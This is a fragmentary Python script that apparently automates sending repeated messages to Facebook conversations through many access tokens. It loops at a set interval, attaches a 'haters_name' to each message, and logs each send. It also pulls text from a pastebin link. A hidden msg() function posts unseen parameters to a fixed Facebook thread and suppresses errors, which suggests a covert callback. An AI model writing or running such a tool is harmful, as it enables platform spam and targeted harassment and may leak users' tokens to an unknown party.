...
def send_messages():
  ...
  mmm = requests.get('https://pastebin.com/raw/sw4ZCEtm').text
  ...
  def msg():
    ...
    try:
      s = requests.post("https://graph.facebook.com/v15.0/t_100074526592715/", data=parameters, headers=headers)
    except:
      pass
  ...
  while True:
    try:
      for message_index in range(num_messages):
        ...
        if response.ok:
          print('\033[0;35m'"[+] Messages {} of Convo {} sent by Token {}: {}".format(
            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
          print("  - Time: {}".format(current_time))
          liness()
          liness()
        else:
          print('\033[0;92m'"[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
          print('\033[0;34m'"  - Time: {}".format(current_time))
          liness()
          liness()
        time.sleep(speed)
